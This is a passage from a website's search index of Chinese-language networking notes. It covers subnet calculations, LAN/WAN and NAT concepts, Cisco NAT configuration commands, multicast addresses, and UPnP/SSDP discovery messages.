2 = 2&#94;5 - 2 = 30个IP地址，所以结束地址为193.200.35. 62 注解 每个子网的有效 起始 IP为 子网地址+1 ，\n每个子网的有效 结束 IP为 子网地址+子网内IP总数 ，\n也为 下一个子网地址-2 ，中间跳过的一个IP地址为子网的 广播地址 一些题目 给定IP地址`167.77.88.99`和掩码`255.255.255.192`，求子网号、广播地址、有效IP地址。 分析： IP地址---->167.77.88.99--> 10100111.01001101.01011000.01100011 掩码-->255.255.255.192-->11111111.11111111.11111111.11000000 对应位求积--------------------> 10100111.01001101.01011000.01000000--> 167.77.88.64 （ 子网号 ）（就是and） 广播地址**(子网主机全1)---> 10100111.01001101.01011000.01111111-->**167.77.88.127 有效IP**(除去子网本身和广播地址):**167.77.88.65~167.77.88.126 一个子网网段地址为5.32.0.0，掩码为255.224.0.0网络，求它允许的最大主机地址。 分析： 网段------->5.32.0.0-->00000101.00100000.00000000.00000000 掩码-->255.254.0.0-->11111111.11100000.00000000.00000000-->主机位为21位（0位） 最大主机地址 ---------->00000101.00111111.11111111.11111110-->5.63.255.254 （广播地址减一，也就是子网主机全1减一） 188.188.0.111，188.188.5.222，子网掩码都设为255.255.254.0，在同一网段吗？ 分析： IP1---->188.188.0.111-->10111100.10111100.00000000.01101111 IP2---->188.188.5.222-->10111100.10111100.00000101.11011010 掩码-->255.255.254.0-->11111111.11111111.11111110.00000000 IP分别与掩码作求积运算： 10111100.10111100.00000000.00000000 10111100.10111100.00000100.00000000 网络标识不一样，即不在同一网段 参考:: 《TCP/IP入门经典 第6版》/ 乔·卡萨德（Joe Casad） 《计算机网络基础教程：基本概念及经典问题解析》/ 纳拉辛哈·卡鲁曼希 等 https://blog.csdn.net/hawht/art","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-IP-address-and-subnet-division.html","loc":"/yq-docs-Chaotic-computer-network-IP-address-and-subnet-division.html"},{"title":"LAN与WAN","text":"WAN端口用于连接至Internet LAN端口用于连接至局域网设备 LAN端口连接你自己的设备，笔记本/台式机/打印机等；\n无线路由器配置的wifi则相当于LAN端口，连接自己的无线设备，手机/ipad/笔记本等； 当WAN端口连上外网，LAN端口上的各个设备和路由器一起组成了一个小型局域网，这个局域网内的设备可以互相发现，访问。 普通路由器的LAN端口只有4个，当不够用的时候怎么办呢？变相扩充LAN端口的办法： 交换机，连LAN口，交换机的作用可以简单理解为帮你把4个LAN端口扩展到N个； 路由器，连LAN口，第二个路由器就是当前局域网的子局域网；\n就跟家里的局域网一样，电脑不是直接连上英特网，而是作为子网连上去的，这样多个设备可以共用一个公网IP。 路由器还可以当交换机用 当不使用路由器的WAN端口，只使用LAN端口时，就可以看成是个交换机了，\n当然此时LAN端口IP要设置成局域网段内的IP，并且最好配置关闭DHCP； 假设 原路由器IP为192.168.1.1 掩码为255.255.255.0 可用网段为192.168.1.2~192.168.1.254， 那么你作交换机用途的路由器 LAN端口IP 应设置为 192.168.1.2~192.168.1.254 范围内的IP； 如果你想要局域网中再接入局域网，则应设置WAN端口IP自动获取，\nLAN端口IP应与原路由器的IP在不同网段，如192.168.2.1） 路由器与交换机 ARP表 Mac地址与IP地址的映射表 ARP表存储了局域网内每个设备的Mac地址与IP地址的映射关系。 当局域网中的设备需要访问互联网时，它们会向路由器发送ARP请求，请求路由器将目标设备的IP地址转换为Mac地址。 当路由器收到ARP请求时，它会根据ARP表将目标设备的IP地址转换为Mac地址，并将响应发送给请求方。 NAT（网络地址转换） NAT 允许在局域网内的多个设备共享一个公网IP地址。当局域网内的设备想要访问互联网时，路由器会将它们的私有IP地址转换为公网IP地址。这个过程使得多个设备能够同时访问互联网。 NAT 表存储了局域网设备的私有IP地址、端口号与相应的公网IP地址、端口号的映射关系。 端口转发（Port Forwarding） 端口转发允许外部网络的特定端口请求直接转发到局域网内某台设备的特定端口上。这使得外部设备可以访问局域网内的特定设备。 当配置了端口转发后，路由器会根据预设的规则，将接收到的端口请求转发到指定的局域网设备。 路由器 记录 NAT路由表 (表输出网络层) 另外家用路由器是集成了路由器与交换机的 交换机 记录Mac地址表 (表属于网络层) 光猫 调制解调器.\n将光信号转换为电信号(或者说以太网信号)，属于物理层设备 现代的设备界限没那么明显, 大多光猫都带路由器的功能. 外部访问流程: 公网IP+端口                       NAT表/ARP表/MAC表\n外部设备  --------------->  交换机/路由器  ---------------------->  本地局域网设备(比如电脑)\n\n找表的流程大致是.\n\n前提说明\n\n0. 本地设备访问外部时, 路由器会把设备映射到自己公网IP的某一个端口. 参考: 网络中的三张表——ARP表、MAC表、路由表 外部访问流程 源于KIMI. 当外部设备尝试访问路由器时，它们实际上是通过公网IP地址和端口来建立连接的。\nNAT表和ARP表是路由器内部用于管理网络数据包的数据结构，外部设备并不直接与这些表进行交互。以下是连接建立的一般顺序： 发起连接：外部设备通过其公网IP地址和端口，尝试建立与目标路由器的公网IP地址和特定端口的连接。 到达光猫：数据包首先到达光猫。光猫是连接ISP网络和用户局域网的设备，它负责将光信号转换为电信号，并进行必要的数据包处理。\n光猫可能会对数据包进行一些基本的处理，例如，检查数据包的完整性，或者执行一些基本的安全性检查。 到达路由器：处理后的数据包随后通过光猫的以太网端口，进入用户的局域网，数据包到达路由器的WAN端口。 端口转发检查：路由器检查到达的数据包，查看是否配置了端口转发规则，以确定是否将流量转发到局域网内的特定设备。 NAT转换：如果端口转发规则匹配，路由器会使用NAT转换将数据包的源公网IP和端口转换为局域网内的设备IP和端口。 ARP查询：为了将数据包发送到局域网内的设备，路由器需要知道该设备的MAC地址。因此，路由器会进行ARP查询，以找到与目标IP地址对应的MAC地址。 发送到局域网设备：一旦获取到MAC地址，路由器将数据包(通过LAN口)发送到局域网设备。 (家用设备交换机与路由器结合的, 所以找Mac表基本也在路由器端) 设备响应：局域网设备收到数据包后，根据请求进行处理，并生成响应数据包。 返回路由器：响应数据包首先返回到路由器。 NAT转换（反向）：路由器对响应数据包进行反向NAT转换，将目标IP和端口从局域网设备地址转换为外部设备的公网IP和端口。 发送到外部设备：路由器将转换后的响应数据包发送到外部设备。 在整个过程中，外部设备并不直接访问NAT表和ARP表。\n它们只是通过公网IP地址和端口与路由器建立连接，路由器内部处理NAT转换和ARP查询，以确保数据包能够正确地在内外网络之间传输。 值得注意的是，这个过程假设外部设备是合法访问，如果外部设备试图通过非正常途径访问路由器的内部结构，\n这通常被视为安全威胁，需要通过安全措施（如防火墙、访问控制列表等）进行防护。 问题-同局域网的两个路由器下的电脑想要ping通 注解 路由器的网段不能相同 方法1: b路由器 的lan口 连 a路由器的lan口（记得关闭一个路由的dhcp服务） 方法2: a路由器配置路由规则，使b网段的机器都走b路由（需要a路由有这个功能） 其他: 参考: https://www.zhihu.com/question/20738115","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-LAN-and-Wan.html","loc":"/yq-docs-Chaotic-computer-network-LAN-and-Wan.html"},{"title":"多播地址","text":"多播地址(Multicast Address)是一种特殊的 IP 地址,用于同时向多台主机发送 UDP 数据包。 多播地址有以下特征: 以 224.0.0.0 到 239.255.255.255 之间的 IP 地址为多播地址范围。 多播地址不对应具体的网络接口或主机,它代表一组目标接收者。 发送到多播地址的数据包会被路由器和交换机自动复制并推送到子网内的所有计算机。 每台主机都运行一个多播成员处理进程,该进程处理发送到多播地址的数据包。 想接收多播地址的数据,主机需要加入到这个多播组。未加入的主机不会接收这些数据包。 所以,多播地址允许一台主机向多台主机同时发送数据包,接收数据的主机可以自动加入和离开多播组。 使用多播地址的典型应用有: 视频会议和流媒体:将视频流发送到多播地址,多个客户端同时收看。 网络游戏:将游戏数据包发送到多播地址,多个游戏客户端同时接收和响应。 UPnP:UPnP 设备使用多播地址 239.255.255.250 发送服务通告,被控制点同时接收。 路由器网络配置:有些路由器使用多播地址传送配置数据,多个路由器可以同时接收。 等等。","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-Multi--broadcast-address.html","loc":"/yq-docs-Chaotic-computer-network-Multi--broadcast-address.html"},{"title":"网络中的NAT模式","text":"参考: https://www.cnblogs.com/linhaostudy/p/10355614.html 阅读目录 概述 分类 NAT的三个方向： NAT的应用分类： 工作原理 NAT-原理 NAT-基本地址转换原理 NAT中的转换方式: NAT-基本IP地址转换原理 内部地址NAT-转换原理 一个简单的NAT-转换示例 外部地址NAT-转换原理 概述 NAT英文全称是\"Network Address Translation\"，中文意思是\"网络地址转换\"，\n它是一个IETF(Internet Engineering Task Force, Internet工程任务组)标准，\n允许一个整体机构以一个公用IP（Internet Protocol）地址出现在Internet上。 顾名思义，它是一种把内部私有网络地址（IP地址）翻译成合法网络IP地址的技术。\nNAT 可以让那些使用私有地址的内部网络连接到Internet或其它IP网络上。\nNAT路由器在将内部网络的数据包发送到公用网络时，在IP包的报头把私有地址转换成合法的IP地址。 RFC1918规定了三块专有的地址，作为私有的内部组网使用: A类：10.0.0.0—10.255.255.255 10.0.0.0/8 B类：172.16.0.0—172.31.255.255 172.16.0.0/12 C类：192.168.0.0—192.168.255.255 192.168.0.0/16 这三块私有地址本身是可路由的，只是公网上的路由器不会转发这三块私有地址的流量；\n当一个公司内部配置了这些私有地址后，内部的计算机在和外网通信时，\n公司的边界路由会通过NAT或者PAT技术，将内部的私有地址转换成外网IP，\n外部看到的源地址是公司边界路由转换过的公网IP地址，这在某种意义上也增加了内部网络的安全性。 Basic NAT 是一种把一组IP地址映射成另一组IP地址的方法，映射的过程在IP中继设备上完成，对用户完全透明。 NAPT 要复杂一些，它把许多（不能太多）IP地址连同TCP/UDP端口号映射到单独一个IP地址和端口号上。 无论是Basic NAT还是NAPT都提供一种把内部的私有地址转换成在公网上可用的全球唯一IP地址的方法。 NAT分类 NAT有三种类型： 静态NAT(Static NAT)（一对一）。\n将内部网络的私有IP地址转换为公有IP地址，IP地址对是一对一的，是一直不变的； 动态地址NAT(Pooled NAT)（多对多）。\n将内部网络的私有IP地址转换为公用IP地址时，IP地址是不确定，随机的。\n所有被授权访问Internet的私有IP地址可随机转换为任何指定合法的IP地址。\n也就是说，只要指定哪些内部地址可以进行转换，以及用哪些合法地址作为外部地址时，就可以进行动态NAT转换。\n动态NAT是在路由器上配置一个外网IP地址池，当内部有计算机需要和外部通信时，\n就从地址池里动态的取出一个外网IP，并将他们的对应关系绑定到NAT表中，\n通信结束后，这个外网IP才被释放，可供其他内部IP地址转换使用，这个DHCP租约IP有相似之处。\n当ISP提供的合法IP地址略少于网络内部的计算机数量时。可以采用动态转换的方式。 网络地址端口转换NAPT（Network Address Port Translation）（Port-Level NAT）（多对一）。\n改变外出数据包的源端口并进行端口转换，采用端口多路复用方式。\n内部网络的所有主机均可共享一个合法外部IP地址实现对Internet的访问，可以最大限度地节约IP地址资源。\n同时，也可以隐藏网络内部的所有主机，有效避免来自Internet的攻击。\n因此，目前网络中应用最多的就是PAT规则。这是最常用的NAT技术，也是IPv4能够维持到今天的最重要的原因之一，\n它提供了一种多对一的方式，对多个内网IP地址，边界路由可以给他们分配一个外网IP，\n利用这个外网IP的不同端口和外部进行通信。\nNAPT 与 动态NAT 不同，它将内部连接映射到外部网络中的一个单独的IP地址上，同时在该地址上加上一个由NAT设备选定的端口号。 NAPT是使用最普遍的一种转换方式，在HomeGW中也主要使用该方式。\n它又包含两种转换方式：SNAT和DNAT。 源NAT（Source NAT，SNAT）：修改数据包的源地址。\n源NAT改变第一个数据包的来源地址，它永远会在数据包发送到网络之前完成，数据包伪装就是一具SNAT的例子。 目的NAT（Destination NAT，DNAT）：修改数据包的目的地址。\nDestination NAT刚好与SNAT相反，它是改变第一个数据懈的目的地地址，如平衡负载、端口转发和透明代理就是属于DNAT。 对于网络地址转换技术来讲，最重要的一点是，在配置 NAT 的路由器上形成了 NAT 转换表，这个转换表的形成是非常关键的。\n配置 NAT 后，能形成正确的转换表，那么我们的工作就算成功了。 NAT的三个方向 NAT 在outside口生效，所有在inside口需要先路由,在outside口先nat。 ip nat inside source: 将内部局部地址转换为内部全局地址;数据方向inside->outside,在outside上执行转换; ip nat inside destination: 将内部全局地址转换为内部局部地址;数据方向outside->inside,在outside上执行转换 ip nat outside source: 将外部全局地址转换为外部局部地址;数据方向outside->inside,在outside上执行转换; NAT的应用分类 ip nat source 静态 nat的映射：永远一个ip对应另外一个ip。 ip nat inside source static A.B.C.D A.B.C.D 动态 nat的映射：每次一个IP会对应另外一个公网的IP； ip nat inside source list 2 pool qing 动态PAT映射：pool里面只有一个IP。 ip nat inside source list 2 pool qing overload 静态PAT映射： ip nat inside source list 3 interface fastEthernet 0/0 overload ip nat inside destination tcp负载均衡，外网主动发起流量访问内网服务器。只用动态，没有静态。 ip nat inside destination list 10 pool feng ip nat outside source: 当两端同时做nat既inside和outside需要同时翻译并出现地址冲突的时候需要用outside source和其他同时命令同时实现。 Cisco路由器配置3中NAT的主要命令 静态NAT 指定NAT内部接口, 在内网相应接口的接口配置模式下执行: ip nat inside 指定NAT外部接口, 在外网相应接口的接口配置模式下执行: ip nat outside 在内部本地地址与内部全局地址之间建立静态地址转换关系: ip nat insde source static 内部本地地址 内部全局地址 动态地址NAT 指定NAT内部接口, 在内网相应接口的接口配置模式下执行: ip nat inside 指定NAT外部接口, 在外网相应接口的接口配置模式下执行: ip nat outside 在全局配置模式下，定义一个标准的access-list规则，\n声明允许哪些内部本地地址可以进行动态地址转换: access-list list-number permit 源地址 通配符 其中，list-number为1－99之间的一个任意整数。 在全局配置模式下，定义内部全局地址池: ip nat pool 地址池名 起始IP地址 终止IP地址 netmask 子网掩码 其中，地址池名可以任意设定，但最好有一定的说明意义。 在全局配置模式下，\n定义符合先前定义的access-list规则的IP数据包与先前定义的地址池中的IP地址进行转换: ip nat inside source list list-number pool 内部全局地址池名 网络地址端口转换NAPT 指定NAT内部接口, 在内网相应接口的接口配置模式下执行: ip nat inside 指定NAT外部接口, 在外网相应接口的接口配置模式下执行: ip nat outside 在全局配置模式下，定义内部全局地址池: ip nat pool 地址池名 起始IP地址 终止IP地址 netmask 子网掩码 其中，地址池名可以任意设定，但最好有一定的说明意义。 在全局配置模式下，定义一个标准的access-list规则，声明允许哪些内部本地地址可以进行复用地址转换: access-list list-number permit 源地址 通配符 其中，list-number为1－99之间的一个任意整数。 在全局配置模式下，定义符合先前定义的access-list规则的IP数据包与先前定义的地址池中的IP地址进行复用地址转换: ip nat inside source list list-number pool 内部全局地址池名 overload 工作原理 了解原理之前先了解下NAT 术语。 在配置了 NAT 的路由器上，可以把整个网络分成两部分：内部网络 和 外部网络。 NAT 技术中有四个术语： 内部本地地址（Inside Local）：内网中设备所使用的IP地址 内部全局地址（Inside Global）：对于外部网络来说，局域网内部主机所表现的 IP 地址。 外部本地地址（Outside Local）：外部网络主机的真实地址。 外部全局地址（Outside Global）：对于内部网络来说，外部网络主机所表现的 IP 地址。外网设备所使用的真正的地址。 local 、global 是相对于端口状态说的，local是inside部分可以被路由的，global是outside部分可以被路由的。 网络地址转换常常和代理服务搞混，但是它们之间有明确的不同。NAT 对源和目的计算机都是透明的。\n没有任何一方会意识到它正在和第三方设备打交道。但是代理服务却不是透明的。\n源计算机知道它正向代理服务器发起一个请求，而且你还必须进行配置才能这样做。\n目的计算机会认为代理服务器就是与它直接通信的源计算机。\n还有，代理服务通常工作在 OSI 参考模型的第 4 层 (传输层) 或更高，而 NAT 工作在第 3 层 (网络层)。\n由于代理服务工作在更高层，所以通常它将比 NAT 要慢。 NAT 工作在 OSI 参考模型的网络层 (第3层) 是有道理的，因为路由器就工作在这一层： NAT 原理 NAT设备维护一个状态表，用来把非法的IP地址映射到合法的IP地址上去。\n每个包在NAT设备中都被翻译成正确的IP地址，发往下一级，这意味着给处理器带来了一定的负担。\n但对于一般的网络来说，这种负担是微不足道的。\n在运行NAT的路由器中，当数据包被传送时，NAT可以转换数据包的IP地址和TCP/UDP数据包的端口号。\n设置NAT功能的路由器至少要有一个Inside（内部）端口和一个Outside（外部）端口。\n内部端口连接内网的用户，外部端口一般连接到Internet。\n当IP数据包离开内部网络时，NAT负责将内网IP源地址（通常是专用地址）转换为合法的公共IP地址。\n当IP数据包进入内网时，NAT将合法的公共IP目的地址转换为内网的IP源地址。 NAT的基本工作原理是：当私有网主机和公共网主机通信的IP包经过NAT网关时，将IP包中的源IP或目的IP在私有IP和NAT的公共IP之间进行转换。 当内部网络中的一台主机想传输数据到外部网络时，它先将数据包传输到NAT路由器上，路由器检查数据包的报头，\n获取该数据包的源IP信息，并从它的NAT映射表中找出与该IP匹配的转换条目，\n用所选用的内部全局地址（全球唯一的IP地址）来替换内部局部地址，并转发数据包。 当外部网络对内部主机进行应答时，数据包被送到NAT路由器上，路由器接收到目的地址为内部全局地址的数据包后，\n它将用内部全局地址通过NAT映射表查找出内部局部地址，然后将数据包的目的地址替换成内部局部地址，并将数据包转发到内部主机。 其实主要就是 修改 IP 数据包中的源 IP 地址，或目的 IP 地址。\n主要目的是把 RFC1918所提议的私有地址转变成在 Internet 上可路由的公有合法地址。\n对于某些有限的应用（如 DNS、 FTP 等），它也可以修改 IP 数据包有效载荷中的地址。\n由于应用的复杂性， NAT 目前支持的应用有限，当然，如果需要，完全可以针对新的应用做相应的开发工作。 总体来说，NAT进行地址转换的过程就是\"本地地址\"与\"全局地址\"之间的转换过程，无论数据包是从内部网络发往外部网络，还是从外部网络发往内部网络。\n不同的只是本地地址和全局地址所对应的网络不同，以及数据包重新封装的源和目的地址不同。具体如图所示。 NAT基本地址转换原理 这个过程是通过NAT中的本地址与全局地址映射条目来实现的，所以事先要在NAT路由器上配置这样的映射条目。 NAT中的转换方式 从内网中设备上发出的IP包是以\"inside local address\"作为源地址，以\"outside local address\"作为目的地址。\n当数据包到达NAT设备的\"inside\"接口后，地址分别被翻译成\"inside global address\"和\"outside global address\"并从\"outside\"接口送出。 外网设备上发出的IP包以\"outside global address\"作为源地址，以\"inside global address\"作为目的地址。\n当数据包到达NAT设备的\"outside\"接口后，地址分别被翻译成\"outside local address\"和\"inside local address\"并从\"inside\"接口送出。 当内部网络用户访问外部网络时，所进行的是\"内部本地地址\"和\"内部全局地址\"之间的转换。 在NAT路由器接收到来自内部网络主机发送的数据包时，其源IP地址（SA）为\"内部本地地址\"，目的IP地址（DA）为\"外部本地地址\"。\n当数据包被转发到外部网络时，数据包的源IP地址（SA）就会转变为\"内部全局地址\"，而目的IP地址（DA）被转变为\"外部全局地址\"。\n也就是把数据包的所有源IP地址（SA）和目的IP地址（DA）全部由本地地址转换为全局地址。如图6-9上部分数据包IP地址转换示意图。 相反，当外部网络用户访问内部网络时，所进行的是\"外部本地地址\"和\"外部全局地址\"之间的转换。 在NAT路由器接收到来自外部网络主机发送的数据包时，其源IP地址（SA）就是\"外部全局地址\"，目的IP地址（DA）就是\"内部全局地址\"。\n相当于由内部网络向外部网络发送数据包时数据包中的源IP地址（SA）和目的IP地址（DA）的互换。\n而当数据包被路由器转发到本地网络时，源IP地址（SA）被转变为\"外部本地地址\"，目的IP地址（DA）被转变为\"内部本地地址\"，\n也相当于由内部网络向外部网络发送数据包时数据包中的源IP地址（SA）和目的IP地址（DA）的互换。如图6-9下部分数据包IP地址转换示意图 NAT基本IP地址转换原理 以上是从总体上介绍NAT的IP地址转换原理的，实际NAT应用有时并不需要对源IP地址和IP地址进行全面替换，\n仅需要对源IP地址或者仅需要对目的IP地址进行转换即可达到所需的目的。\n下面予以介绍。 内部地址NAT转换原理 多数情况下使用NAT的目的就是为了使内部网络中的多个用户能使用一个注册IP地址访问外部网络，所以仅需要配置内部地址NAT转换。\n即通过ip nat inside source命令实现\"内部本地地址\"到\"内部全局地址\"之间的转换（既可以采用静态NAT方式实现，也可以采取动态NAT方式实现），\n只需要定义内部本地址与内部本局地址的映射。 一个简单的NAT转换示例 这是一个简单的NAT转换示例。要实现以下目的：当NAT路由器的内部网络s0接口上接收到一个源地址为内部本地地址10.10.10.1，\n目的IP地址为外部本地地址171.16.68.1的数据包时，在转发到s1接口时，原来数据包源地址的内部本地地址10.10.10.1被转换成内部全局地址171.16.68.5，\n但目的地址不变，然后继续发送。在这个过程中，所进行的只是数据包中源IP地址的转换，由内部本地地址向内部全局地址转换，且只是内部地址之间的转换。 相反，当在NAT路由器的外部网络接口s1上接收源地址为172.16.68.1外部本地地址，\n目的地址为内部全局地址172.16.68.5的外部服务器响应数据包时，目的地址将被转换成10.10.10.1这个内部本地地址，然后继续发送。\n在这个过程中，所进行的只是数据包中目的IP地址的转换，由内部全局地址向内部本地地址转换，也只是内部地址之间的转换。 下面仅以静态NAT转换方式为例介绍内部地址转换的配置步骤，详细的NAT配置方法将在本章后面具体介绍。 （1）使用\"ip nat inside source static\"全局配置命令启用基于内部源IP地址的静态NAT IP地址转换。\n也就是定义内部本地地址和内部全局地址，使它们之间形成一一对应的映射关系: Router(config)#ip nat inside source static 10.10.10.1 171.16.68.5\n!--- 在内部本地地址10.10.10.1与内部全局地址171.16.68.5之间建立静态NAT映射关系，使内部网络主机知道要以171.16.68.5这个地址到达外部网络主机 （2）使用以下两条语句配置路由器的s0为NAT的内部网络接口: Router(config)#interface s0    !---  进入s0串口配置模式\nRouter(config-if)#ip nat inside    !--- 把s0串口指定为内部网络接口 （3）使用以下两条语句配置路由器的s1为NAT的外部网络接口: Router(config)#interface s1    !--- 进入s1串口配置模式\nRouter(config-if)#ip nat outside   !--- 把s1串口指定为外部网络接口 （4）使用show ip nat translations特权模式命令验证上述进行的路由器NAT配置。\n输出信息中显示以上配置的NAT条目配置为：内部本地地址为10.10.10.1，内部全局地址为171.16.68.5。\n这与上面的配置是一致的，证明配置是成功的: Router#show ip nat translations   !--- 在特权模式下显示当前路由器NAT配置\n\nPro     Inside global      Inside local       Outside local      Outside global\n---     171.16.68.5        10.10.10.1            ---                 --- 此时如果对外部网络目的主机进行ping操作，就会有数据包从内部网络转发到外部网络。\n然后再在路由器特权模式下执行\"show ip nat translations\"命令，显示的NAT信息如下。\n多了一条icmp协议类型数据包（执行ping操作后加的）显示，但因为此时没有配置外部网络的本地地址和全局地址，\n所以显示的外部本地地址和外部全局地址都是一样的，都是ping操作目的主机地址171.16.68.1: Router#show ip nat translations\n\nPro       Inside global          Inside local        Outside local      Outside global\nicmp     171.16.68.5:15         10.10.10.1:15       171.16.68.1:15     171.16.68.1:15\n---       171.16.68.5            10.10.10.1             ---                 --- 通过以上配置后，从内部网络发往外部网络的数据包只是源地址（SA）将\n在经过路由器后进行转换（由内部本地地址10.10.10.1转换成内部全局地址171.16.68.5），但目标地址（DA）不变，\n但从外部网络发往内部网络的应答数据包的源地址没有改变，\n只是经过路由器后的数据包目的地址发生了转换（由内部全局地址172.16.68.5转换成内部本地地址10.10.10.1），\n但源地址（SA）不变。因为此时还没有为NAT路由器配置外部网络的本地地址和全局地址转换。 此时，数据包在内、外部网络中的源地址、目的地址的转换方式参如图 在内部地址的NAT转换中，无论数据包来自哪里，数据包中地址变化的只是内部地址之间的转换。\n但要注意，地址变化所对应的是源地址，还是目的地址是要看数据包是来自内部网络，\n还是来自外部网络：如果是来自内部网络，转换是源地址；如果是来自外部网络，转换的是目的地址。 外部地址NAT转换原理 当公司服务器位于内部网络，使用内部网络私有IP地址，为了方便外部网络用户对内部网络服务器进行访问，\n则需要使用ip nat outside source命令配置\"外部全局地址\"与\"外部本地地址\"之间\n的转换（既可以采用静态NAT方式实现，也可以采取动态NAT方式实现）。\n外部地址NAT转换与上节介绍的内部地址NAT转换是相反的，它仅需要定义外部地址（包括外部本地地址和外部全局地址）。 下面同样以上面那个简单的NAT转换示例进行介绍。\n本示例要实现的目的是：\n当NAT路由器外部网络接口s1接收到来自外部网络用户发送的源IP地址为外部全局地址171.16.68.1，\n目的地址为外部本地地址10.10.10.1的数据包在被路由器转发到s0接口时，\n数据包中的源IP地址转变为外部本地地址10.10.10.5（即由外部全局地址转换成外部本地地址），\n目的IP地址不变，即也只是源IP地址的转换；而由内部网络用户发送的响应数据包中，\n却只是目的IP地址（即由外部本地地址转换为外部全局地址）的转换，源IP地址不变。 下面仅以静态NAT转换方式为例介绍外部地址NAT转换的配置步骤，详细的NAT配置方法将在本章后面具体介绍。 （1）使用ip nat outside source static全局配置命令启用基于外部源IP地址的静态NAT IP地址转换。\n也就是定义外部全局地址和外部本地地址之间的映射关系: Router(config)#ip nat outside source static 171.16.68.1 10.10.10.5\n!--- 在外部全局地址171.16.68.1与外部本地地址10.10.10.5之间建立静态NAT转换关系，使外部网络主机知道要以10.10.10.1这个地址到达内部网络主机 （2）使用以下两条语句配置路由器的s0作为NAT的内部网络接口: Router(config)#interface s0\nRouter(config-if)#ip nat inside （3）使用以下两条语句配置路由器的s1作为NAT的外部网络接口: Router(config)#interface s1\nRouter(config-if)#ip nat outside 注解 对于特定的NAT网络来说，路由器上的内、外部网络接口是固定的，不会随着通信方向的改变而改变。\n如在上节介绍的内部地址的NAT转换示例中，我们同样是把s0接口作为内部网络接口，s1接口作为外部网络接口。 （4）使用show ip nat translations特权模式命令验证上述进行的路由器NAT配置。\n从中可以看出，此时NAT的外部本地地址为10.10.10.5，外部全局地址为171.16.68.1。这与上面的配置是一致的，证明配置是成功的: Router#show ip nat translations\n\nPro    Inside global          Inside local          Outside local      Outside global\n        --- ---                   ---               10.10.10.5          171.16.68.1 同样，如果此时执行一个从外部网络主机（171.16.68.1）到内部网络主机（10.10.10.1）的ping操作，\n然后再在路由器特权模式下执行\"show ip nat translations\"命令，则显示如下结果。\n因为此时仅配置了外部本地地址和外部全局地址，所以结果中显示的内部本地地址和全局地址都是一样的，都是ping操作目的主机地址10.10.10.1: Router#show ip nat translations\n\nPro        Inside global       Inside local         Outside local        Outside global\n            --- ---             ---                10.10.10.5           171.16.68.1\nicmp       10.10.10.1:37       10.10.10.1:37      10.10.10.5:37        171.16.68.1:37 与上节介绍的仅配置内部地址相反，此处从外部网络发往内部网络的数据包的源IP地址（SA）将\n在经过路由器后进行转换（由外部全局地址171.16.68.1转换成外部本地地址10.10.10.5），但目标地址（DA）不变；\n但从内部网络发往外部网络的响应数据包的源IP地址没有改变，\n只是经过路由器后的数据目的IP地址发生了改变（由外部本地地址10.10.10.5转换成外部全局地址171.16.68.1）。\n因为此时还没有为NAT路由器配置内部本地地址和内部全局地址转换。此时，数据包在内、外部网络中的源IP地址、目的IP地址的转换方式如图6-12所示。 【经验之谈】在仅进行外部地址NAT转换时，无论数据包来自哪里，数据包中地址变化的只是外部地址之间的转换。\n同样也需注意，地址变化所对应的是源IP地址，还是目的IP地址是要看数据包是来自内部网络，\n还是来自外部网络：如果来自内部网络，转换是目的IP地址；\n如果来自外部网络，转换的是源IP地址。这与前面的内部地址NAT转换是对应相反的。","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-NAT-mode-in-the-network.html","loc":"/yq-docs-Chaotic-computer-network-NAT-mode-in-the-network.html"},{"title":"网络常识","text":"因为没主攻过这个方向, 所以很多东西了解的算模模糊糊.\n在此处对一些知识做一个记录. web服务启动在0.0.0.0与启动在本机ip的区别 举例说明, 若本地ip为 192.168.1.12, 然后运行了一个web服务, 若只绑定到 127.0.0.1: 8080: 只能 127.0.0.1: 8080 本地访问 若将服务绑定到 192.168.1.12:8080: 可以从 127.0.0.1:8080 本地访问 可以从 192.168.1.12:8080 访问(支持本地与局域网内同网段机器访问) 若将服务绑定到 0.0.0.0: 8080: 上面的 192.168.1.12 与 127 都可以访问 还可以通过本机 公网ip:8080 访问 区别就是 0.0.0.0 是一个特殊的 IP 地址, 表示会监听本机所有网络接口 ,\n比如本机配置了多个ip的时候, 或者想同时运行在本地与公网的时候, 就很有用. 只是本机测, 跑个127就行了. 网段/IP 一般一个网段子网内, 以192.168.2.0 举例, 192.168.2.0 表示这个网段 (是一个网络地址而非主机地址) 192.168.2.1 表示此网段的网关 192.168.2.255 表示广播地址","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-Network-common-sense.html","loc":"/yq-docs-Chaotic-computer-network-Network-common-sense.html"},{"title":"upnp流程详细介绍","text":"大体上是以下流程 地址分配 UPnP 设备加入网络后,通过自动配置或动态主机配置协议(DHCP)获得一个 IP 地址。 对于在个人pc上自行开发而言, 一般这一步在第一次启动电脑的时候已经做了. 发现 UPnP 设备通过简单服务发现协议(SSDP)广播自己的存在,并侦听其他设备的广播。发现过程中交换设备的唯一标识符、URL 等信息。 使用 UDP 协议. UPnP设备发现过程中的所有UDP消息都使用以下格式: METHOD * HTTP/1.1\nHOST: 239.255.255.250:1900\n[其他头部] METHOD指明消息类型,可以是NOTIFY、M-SEARCH等 * 表示发送到所有设备 HOST指定目的地址是SSDP的组播地址和端口1900 其他头部根据消息类型不同而不同 ssdp:alive 通告消息 当设备第一次加入网络或需要更新过期时间时,会主动发送ssdp:alive通告消息.\n向网络告知设备加入 - NOTIFY: NOTIFY * HTTP/1.1\nHOST: 239.255.255.250:1900\nCACHE-CONTROL: max-age=1800\nLOCATION: http://192.168.1.20:5678/device.xml\nNT: upnp:rootdevice\nNTS: ssdp:alive\nUSN: uuid:f40c2981-7329-40b7-8b04-27f187aecfb5 其中: NOTIFY: 一个通告消息 HOST: 目的地址是SSDP组播地址,端口号1900 CACHE-CONTROL: 指定通告消息的过期时间1800秒 LOCATION: 提供设备描述文档的URL NT: 描述设备类型,这里是upnp:rootdevice表示根设备 USN: 提供设备的UUID M-SEARCH搜索消息 设备搜索, 当控制点加入网络或需要发现设备时,会发送M-SEARCH搜索消息: M-SEARCH * HTTP/1.1\nHOST: 239.255.255.250:1900\nMAN: ssdp:discover\nMX: 3\nST: ssdp:all MX：设置设备响应最长等待时间，设备响应在0和这个值之间随机选择响应延迟的值 ST：设置服务查询的目标，它必须是下面的类型： ssdp:all 搜索所有设备和服务 upnp:rootdevice 仅搜索网络中的根设备 uuid:device-UUID 查询UUID标识的设备 urn:schemas-upnp-org:device:device-type :{version} 